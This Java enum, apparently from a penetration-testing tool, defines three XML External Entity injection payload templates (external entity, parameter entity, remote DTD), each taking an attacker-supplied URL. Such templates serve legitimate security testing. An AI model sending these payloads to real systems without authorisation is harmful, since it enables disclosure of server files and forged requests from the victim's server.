package de.codewhite.jmet.types;

/**
 * Created by kaimatt.
 */
public enum XXETypes {

    EXTERNAL("<!DOCTYPE x [ <!ENTITY foo SYSTEM \"{0}\"> ]><x>External entity &foo;</x>"),
    PARAMATER("<!DOCTYPE x [ <!ENTITY % foo SYSTEM \"{0}\"> %foo; ]><x>Parameter entity</x>"),
    DTD("<!DOCTYPE x SYSTEM \"{0}\"><x>Remote DTD</x>");

    private final String vector;

    XXETypes(String vector) {
        this.vector = vector;
    }

    public String vector(){
        return vector;
    }
}
